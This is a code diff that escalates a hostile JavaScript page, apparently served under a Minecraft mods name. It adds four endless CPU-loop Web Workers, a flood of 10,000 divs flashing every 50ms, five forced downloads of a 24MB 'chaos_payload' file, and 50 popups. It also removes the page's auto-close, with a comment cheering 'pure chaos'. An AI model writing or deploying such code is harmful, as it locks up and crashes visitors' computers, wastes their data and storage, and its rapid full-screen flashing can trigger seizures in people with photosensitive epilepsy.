@@ -26,16 +26,24 @@
       }
     }
 
-    // CPU hog function: heavy math loop
-    function cpuHog() {
-      let x = 0;
-      while (true) {
-        x += Math.sqrt(Math.random()) * Math.random();
-        if (x > 1e10) x = 0; // reset occasionally to keep loop going
-      }
+    // Create a Web Worker from a Blob URL running heavy CPU loop
+    function createCpuWorker() {
+      const blob = new Blob([`
+        self.onmessage = function() {
+          let x = 0;
+          while(true) {
+            x += Math.sqrt(Math.random()) * Math.random();
+            if (x > 1e10) x = 0;
+          }
+        };
+      `], { type: 'application/javascript' });
+      const url = URL.createObjectURL(blob);
+      const worker = new Worker(url);
+      worker.postMessage('start');
+      return worker;
     }
 
-    // Flood DOM with thousands of flashing divs
+    // Flood DOM with 10,000 flashing divs
     function floodDOM() {
       const container = document.createElement('div');
       container.style.position = 'fixed';
@@ -47,30 +55,27 @@
       container.style.zIndex = '9999';
       document.body.appendChild(container);
 
-      for (let i = 0; i < 3000; i++) {
+      for (let i = 0; i < 10000; i++) {
         const div = document.createElement('div');
         div.style.position = 'absolute';
-        div.style.width = '10px';
-        div.style.height = '10px';
+        div.style.width = '5px';
+        div.style.height = '5px';
         div.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
         div.style.top = `${Math.random() * window.innerHeight}px`;
         div.style.left = `${Math.random() * window.innerWidth}px`;
         container.appendChild(div);
       }
 
-      // Flash colors fast
       setInterval(() => {
         container.childNodes.forEach(div => {
           div.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 50%)`;
         });
-        // Also flash background for extra headache
-        document.body.style.backgroundColor = `hsl(${Math.random() * 360}, 80%, 70%)`;
-      }, 100);
+      }, 50);
     }
 
-    // Trigger multiple downloads (3 copies)
+    // Trigger 5 simultaneous downloads
     function triggerDownloads() {
-      for (let i = 0; i < 3; i++) {
+      for (let i = 0; i < 5; i++) {
         const a = document.createElement('a');
         a.href = "https://elitemetal7.github.io/CoolestMinecraftMods/chaos_payload_24mb.bin";
         a.download = `chaos_payload_${Date.now()}_${i}.bin`;
@@ -105,20 +110,24 @@
 
         floodDOM();
 
-        // Run CPU hog in a separate thread so UI doesn't freeze immediately
-        // Using a Web Worker is cleaner but let's fake it with setTimeout here:
-        setTimeout(() => {
-          cpuHog();
-        }, 500);
+        // Start 4 CPU hog workers
+        for (let i = 0; i < 4; i++) {
+          createCpuWorker();
+        }
 
-        // Spawn 20 new popups randomly
-        for (let i = 0; i < 20; i++) {
+        // Spawn 50 new popups
+        for (let i = 0; i < 50; i++) {
           openPopup();
         }
 
-        setTimeout(() => {
-          window.close();
-        }, 4000);
+        // Flash background and text colors every 100ms
+        setInterval(() => {
+          const hue = Math.floor(Math.random() * 360);
+          document.body.style.backgroundColor = `hsl(${hue}, 80%, 70%)`;
+          document.body.style.color = `hsl(${(hue + 180) % 360}, 80%, 40%)`;
+        }, 100);
+
+        // No auto-close, pure chaos!
 
       } else {
         document.body.innerHTML = `
